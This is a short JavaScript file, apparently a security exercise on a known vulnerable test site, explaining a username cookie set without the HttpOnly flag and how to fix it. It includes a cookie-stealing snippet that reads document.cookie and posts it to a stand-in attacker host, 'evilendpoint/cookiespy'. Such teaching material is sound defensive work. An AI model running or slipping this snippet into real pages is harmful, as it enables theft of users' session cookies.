// http://testhtml5.vulnweb.com/#/popular


// Problem:
// after the login action the system will set the usernam cookie, this cookie omits the HTTPOnlyCookie flag.
// If the HttpOnlyCookie is not set javascript will have access to this cookie 


// Exployed example:
// If the website has other flaws like possible XSS weeknesses the hacker could run malicious code on the client.
// The code can access the cooke and send the information to a malicious endpoint

const cookie = document.cookie;

fetch('https://evilendpoint/cookiespy', {
  method: 'POST',
  headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
  },
  // in our case only the username cookie which will be "username=admin"
  body: JSON.stringify({ "cookie": cookie })
})
.then(() => console.log('YOU HAVE BEEN HACKED'))


// Fix:
// If you dont't want JS to access a cookie, set the HTTPOnlyCookie flag like follow:
// HTTP response header Set-Cookie should look like follow Set-Cookie: username=<cookie-value>; HttpOnly